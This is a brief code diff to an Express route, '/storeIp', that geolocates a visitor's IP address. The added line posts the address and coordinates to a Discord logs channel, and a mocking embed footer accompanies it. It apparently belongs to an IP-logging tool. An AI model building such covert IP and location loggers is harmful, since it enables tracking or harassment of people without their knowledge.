@@ -42,7 +42,6 @@ app.get("/storeIp", (req, res) => {
   let lat = ipInfo.ll[0];
   let long = ipInfo.ll[1];
 
-  let message;
 
   let file;
   // Only parse if not your ip
@@ -90,6 +89,8 @@ app.get("/storeIp", (req, res) => {
       )
       .setTimestamp()
       .setFooter("He do be getting yeeted doe");
+      
+      logsChannel.send(messageEmbed);
       res.send(ipInfo);
 });
 
